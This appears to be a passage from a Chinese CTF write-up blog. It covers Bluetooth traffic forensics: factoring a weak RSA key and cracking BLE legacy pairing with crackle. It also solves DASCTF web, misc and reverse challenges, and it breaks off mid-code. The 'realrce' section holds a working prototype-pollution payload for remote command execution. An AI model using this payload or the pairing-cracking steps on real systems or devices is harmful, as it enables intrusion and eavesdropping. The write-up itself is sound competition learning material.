class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(g0at㉿kali)-[~/桌面]<br>└─$ openssl rsa -<span class="hljs-keyword">in</span> 2.key -text -inform PEM -pubin<br>Public-Key: (512 bit)<br>Modulus:<br>    00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:<br>    59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:<br>    1a:43:ce:5b:e7:<span class="hljs-built_in">fc</span>:24:6c:e0:60:94:56:6e:87:a4:<br>    72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:<br>    44:09:d4:a8:09<br>Exponent:<br>    00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:<br>    77:<span class="hljs-built_in">df</span><br>writing RSA key<br>-----BEGIN PUBLIC KEY-----<br>MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m<br>B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li<br>4l+RI2g0FqJvf3ff<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>往下看，在Handle为<code>0x0014</code>的通信中发现密文<br><img src="/mdimg/Bluetooth/4.png"><br><img src="/mdimg/Bluetooth/5.png"><br>切换为原始存储，手动去掉0即可密文c<br><img src="/mdimg/Bluetooth/6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:</span><br><span class="hljs-string">59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:</span><br><span class="hljs-string">1a:43:ce:5b:e7:fc:24:6c:e0:60:94:56:6e:87:a4:</span><br><span class="hljs-string">72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:</span><br><span class="hljs-string">44:09:d4:a8:09</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>m=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:</span><br><span class="hljs-string">77:df</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>x=<span class="hljs-string">&quot;392969b018ffa093b9ab5e45ba86b4aa070e78b839abf11377e783626d7f9c4091392aef8e13ae9a22844288e2d27f63d2ebd0fb90871016fde87077d50ae538&quot;</span><br><br>n = s.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>e = m.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>n = <span class="hljs-built_in">int</span>(n, <span class="hljs-number">16</span>)<br>e = <span class="hljs-built_in">int</span>(e, <span class="hljs-number">16</span>)<br>c = <span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>)<br><br><span class="hljs-comment">#factorDB分解一下n</span><br>p = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418249279</span><br>q = <span class="hljs-number">92270847179792937622745249326651258492889546364106258880217519938223418258871</span><br><br><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>phi_n=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=libnum.invmod(e,phi_n)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-comment">#print(m)</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#CHTB&#123;5p34k_fr13nd_4nd_3n73r&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CVVD-2022智能网联汽车漏洞挖掘赛"><a href="#CVVD-2022智能网联汽车漏洞挖掘赛" class="headerlink" title="CVVD 2022智能网联汽车漏洞挖掘赛"></a>CVVD 2022智能网联汽车漏洞挖掘赛</h2><h3 id="蓝牙钥匙的春天"><a href="#蓝牙钥匙的春天" class="headerlink" title="蓝牙钥匙的春天"></a>蓝牙钥匙的春天</h3><p>一个蓝牙流量包，随便翻翻发现存在 SMP 协议，全称是 Secure Manager Protocol，是蓝牙用来定义配对和密钥分发的，具体可以看这篇文章<a href="http://t.csdnimg.cn/VMihl">http://t.csdnimg.cn/VMihl</a></p><p>另外可以注意到这里使用了BlUETOOTH_LE_LL帧。</p><p><img src="/mdimg/Bluetooth/7.png"></p><p>由于配对后的流量是被加密的，所以这里看不到他们传输了什么信息，但是有个工具 crackle 是可以解密这种数据包的，这个工具解密蓝牙流量有三个前提，这也在官方的 FAQ 中提到了：<br><a href="https://github.com/mikeryan/crackle/blob/master/FAQ.md">https://github.com/mikeryan/crackle/blob/master/FAQ.md</a></p><p>When should I use Crackle?</p><p>Crackle is useful when you have sniffed a BLE connection that uses Link Layer encryption and LE Legacy pairing. Before attempting to use Crackle, it’s worth asking the following questions:</p><ol><li>Can I log the data without having to sniff it at all?</li><li>If not, is my device actually using Link Layer encryption?</li><li>Is the device using Legacy Pairing or LE Secure Connections?</li></ol><p>If the answers to these questions are “no”, “yes”, and “legacy pairing”, Crackle is the right tool for the job.</p><p>翻译一下就是：使用链路层加密和 LE Legacy 配对的 BLE 连接时，Crackle 非常有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/arunima06/crackle.git<br><br><span class="hljs-built_in">cd</span> crackle<br><br>sudo apt-get install libpcap-dev<br><br>make<br><br>sudo make install<br></code></pre></td></tr></table></figure><p>使用添加了BlUETOOTH_LE_LL帧支持的老哥的工具解密流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">g0at@Ubuntu22:~/桌面$ crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o de.pcapng<br>PCAP contains [BLUETOOTH_LE_LL] frames<br>Found 1 connection<br><br>Analyzing connection 0:<br>  7e:6f:08:2a:8d:36 (random) -&gt; 34:15:13:87:bf:e9 (public)<br>  Found 51 encrypted packets<br>  Cracking with strategy 0, 20 bits of entropy<br><br>  !!!<br>  TK found: 000000<br>  ding ding ding, using a TK of 0! Just Cracks(tm)<br>  !!!<br><br>  Decrypted 51 packets<br>  LTK found: 34f4bcd107ad8f6833acf01059719d8b<br><br>Decrypted 51 packets, dumping to PCAP<br>Done, processed 1494 total packets, decrypted 51<br></code></pre></td></tr></table></figure><p>再打开解密后的流量包，可以看到Handle为<code>0x0012</code>处已经有数据</p><p><img src="/mdimg/Bluetooth/8.png"></p><p>拿到赛博厨子的魔术棒显示，解两次Hex就是字符串，另外发现Value有一些重复</p><p><img src="/mdimg/Bluetooth/9.png"></p><p>然后就是基于GPT的exp构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">import pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;de.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = []<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> hasattr(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) and hasattr(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        <span class="hljs-comment"># 去掉冒号</span><br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment"># 在每个value后面加上换行符</span><br>        value_with_newline = value_without_colon + <span class="hljs-string">&#x27;\n&#x27;</span><br>        values.append(value_with_newline)<br><br><span class="hljs-comment"># 使用set去除重复的value，然后再转换回list</span><br>values = list(<span class="hljs-built_in">set</span>(values))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(values))<br><br><span class="hljs-comment"># 对每个value单独解两次hex编码</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values:<br>    decoded_value = bytes.fromhex(value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    final_decoded_value = bytes.fromhex(decoded_value).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(final_decoded_value)<br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">3337333333363335333236333330363536353330</span><br><span class="hljs-string">3636364336313637374233393632363133333339</span><br><span class="hljs-string">33343334333136323634333433303744</span><br><span class="hljs-string">3633333733363633363133363633363233333336</span><br><span class="hljs-string"></span><br><span class="hljs-string">73652c0ee0</span><br><span class="hljs-string">c76ca6cb36</span><br><span class="hljs-string">flag&#123;9ba39</span><br><span class="hljs-string">441bd40&#125;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment">#flag&#123;9ba3973652c0ee0c76ca6cb36441bd40&#125;</span><br><span class="hljs-comment">#flag&#123;9ba39c76ca6cb3673652c0ee0441bd40&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023数字中国·数据安全产业人才能力挑战赛决赛"><a href="#2023数字中国·数据安全产业人才能力挑战赛决赛" class="headerlink" title="2023数字中国·数据安全产业人才能力挑战赛决赛"></a>2023数字中国·数据安全产业人才能力挑战赛决赛</h2><h3 id="AreYouOK-Pro"><a href="#AreYouOK-Pro" class="headerlink" title="AreYouOK Pro"></a>AreYouOK Pro</h3><p>仍然是给了一个日志文件，用wireshark打开，简单过一遍应该是尼康相机向HUAWEI P30 Pro发送了一个文件，这里用了RFCOMM协议<a href="http://t.csdnimg.cn/Kbzsl">【蓝牙RFCOMM 协议】-CSDN博客</a></p><p>往下看，从932帧开始有数据在传输，</p><p><img src="/mdimg/Bluetooth/10.png"></p><p>在964帧，确定为传输的是一张jpg图片</p><p><img src="/mdimg/Bluetooth/11.png"></p><p>看到了jpg的文件头，所以图片从968帧开始传输</p><p><img src="/mdimg/Bluetooth/12.png"></p><p>观察Data数据发现，后面的长度均为680（猜测这是单个数据块最大值）在jpg文件头前还有一段数据，猜测传输过程是将文件分块传输，每块前均有固定的传输标识符，翻看Data数据，在下面也多次发现<code>a5a50100</code>这段数据，<code>_ws.col.protocol == &quot;RFCOMM&quot;</code>筛选出RFCOMM传输数据的过程，导出分组为json文件。</p><p><img src="/mdimg/Bluetooth/13.jpg"></p><p><img src="/mdimg/Bluetooth/14.png"></p><p>根据json文件格式写脚本，从”frame.number”: “968”图片正式传输开始读取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">import json<br><br><span class="hljs-comment"># 打开并读取JSON文件</span><br>with open(<span class="hljs-string">&quot;1.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br>    packets = json.load(f)<br><br>data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets:<br>    layers = packet[<span class="hljs-string">&quot;_source&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>]<br>    <span class="hljs-comment"># 检查&quot;frame.number&quot;键是否存在，且值大于等于968</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;frame.number&quot;</span> <span class="hljs-keyword">in</span> layers[<span class="hljs-string">&quot;frame&quot;</span>] and int(layers[<span class="hljs-string">&quot;frame&quot;</span>][<span class="hljs-string">&quot;frame.number&quot;</span>]) &gt;= 968:<br>        <span class="hljs-comment"># 检查&quot;data&quot;键是否存在</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;data&quot;</span> <span class="hljs-keyword">in</span> layers:<br>            data += layers[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;data.data&quot;</span>].replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>data = data.split(<span class="hljs-string">&quot;a5a50100&quot;</span>)<br>newdata = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br>    newdata += x[8:]<br><br><span class="hljs-comment"># 将newdata字符串的第24个字符之后的部分进行hex解码，得到一个字节串</span><br><span class="hljs-comment"># 然后，将这个字节串写入到一个名为&quot;flag.jpg&quot;的文件中</span><br>with open(<span class="hljs-string">&quot;flag.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>    f.write(bytes.fromhex(newdata[24:]))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/flag.jpg"></p><h2 id="第七届工业信息安全技能大赛车联网安全锦标赛"><a href="#第七届工业信息安全技能大赛车联网安全锦标赛" class="headerlink" title="第七届工业信息安全技能大赛车联网安全锦标赛"></a>第七届工业信息安全技能大赛车联网安全锦标赛</h2><h3 id="GAGA-TT"><a href="#GAGA-TT" class="headerlink" title="GAGA TT"></a>GAGA TT</h3><p>这个就太简单了，一眼丁真，数据在Handle为<code>0x003b</code>中，套用上面的脚本直接梭哈</p><p><img src="/mdimg/Bluetooth/15.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;IOT.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = []<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        values.append(value_without_colon)<br><br><span class="hljs-comment">#print(&#x27;&#x27;.join(values))</span><br><br>values_str = <span class="hljs-string">&#x27;&#x27;</span>.join(values)<br>values_str = <span class="hljs-built_in">bytes</span>.fromhex(values_str).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(values_str)<br><br><span class="hljs-comment">#fk7lqp2ey17cuma7s8gb336e2d42def9a8fJepbUdL2D3c9XzVkhHWu0AstQnOZEmBRqw1y4gISNYrTiF5fskirt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝牙流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF十一月挑战赛</title>
    <link href="/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://4d2b8a71-91db-4dbf-b95a-6be4d3505e29.node4.buuoj.cn:81/&#x27;</span><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;cmd_rce&quot;</span>: <span class="hljs-string">&quot;env&quot;</span>,<br>            <span class="hljs-string">&quot;tingshuitingdiandaxue&quot;</span>: <span class="hljs-string">&quot;%dd&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url, json=payload)<br><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="IceTea"><a href="#IceTea" class="headerlink" title="IceTea"></a>IceTea</h3><p><img src="/mdimg/2023DASCTF11/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">/www/wwwroot/DAS202310.com/<br><br>cd <span class="hljs-string">&quot;/www/wwwroot/DAS202310.com&quot;</span>;<br><br>./ezbase e flag.txt IceTea.txt;<br></code></pre></td></tr></table></figure><p>可以看到对flag.txt执行了base加密操作，追踪TCP流，在流0处，找到一个ELF文件<br><img src="/mdimg/2023DASCTF11/2.png"><br><img src="/mdimg/2023DASCTF11/3.png"></p><p>dump下来查壳发现有upx壳，脱壳后得到Base64的表（这应该是出题人设想的预期解）但实际上我猜测elf文件损坏，导致无法直接使用UPX脱壳工具自动脱壳。在HTTP流4，找到密文（🐜🗡流量要去掉前两位）</p><p><img src="/mdimg/2023DASCTF11/4.png"> </p><p>IDA打开dump下来的elf文件，查看strings，发现有疑似base表的信息，跟进去看一下</p><p><img src="/mdimg/2023DASCTF11/8.png"></p><p>Shift+e看一下</p><p><img src="/mdimg/2023DASCTF11/9.png"></p><p>解一下Hex，就可以看到表了，手动去一下干扰字符</p><p><img src="/mdimg/2023DASCTF11/10.png"></p><p><a href="https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ">https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ</a></p><p><img src="/mdimg/2023DASCTF11/11.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p>010打开pyc文件发现key：<code>yuanshen</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><br><span class="hljs-built_in">print</span>(importlib.util.MAGIC_NUMBER.<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#a70d0d0a</span><br></code></pre></td></tr></table></figure><p>得到Python3.11的Magic Number，用010修复pyc<br><img src="/mdimg/2023DASCTF11/6.png"><br>使用工具反编译<br><img src="/mdimg/2023DASCTF11/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyDes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_length</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &lt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &gt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>[:<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">yuanshen</span>(<span class="hljs-params">array, start, end</span>):<br>Unsupported opcode: JUMP_BACKWARD<br>    num = <span class="hljs-built_in">len</span>(array)<br>    dis = [<br>        <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)] * num<br>    tree = [<br>        <span class="hljs-literal">False</span>] * num<br>    parent = [<br>        -<span class="hljs-number">1</span>] * num<br>    dis[start] = <span class="hljs-number">0</span><br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qidong</span>(<span class="hljs-params"><span class="hljs-built_in">input</span>, key, IV</span>):<br>    cipher = pyDes.des(key, pyDes.CBC, IV, pad = <span class="hljs-literal">None</span>, padmode = pyDes.PAD_PKCS5)<br>    encrypted_data = cipher.encrypt(<span class="hljs-built_in">input</span>)<br>    encrypted_hex_list = encrypted_data()<br>    <span class="hljs-keyword">return</span> encrypted_hex_list<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span 